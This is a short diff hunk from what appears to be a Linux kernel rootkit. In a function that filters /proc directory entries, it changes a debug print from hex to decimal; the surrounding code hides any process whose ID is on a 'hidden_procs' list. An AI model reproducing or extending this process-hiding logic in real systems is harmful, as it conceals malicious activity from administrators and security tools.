@@ -163,7 +163,7 @@ static int n_proc_filldir( void *__buf, const char *name, int namelen, loff_t of
     list_for_each_entry ( hp, &hidden_procs, list )
 	{
 		#if __DEBUG__
-		printk("hp->pid: %0x\tpid: %0x\n", hp->pid, (unsigned int)pid);
+		printk("hp->pid: %d\tpid: %d\n", hp->pid, (unsigned int)pid);
 		#endif
         if ( pid == hp->pid )
             return 0;
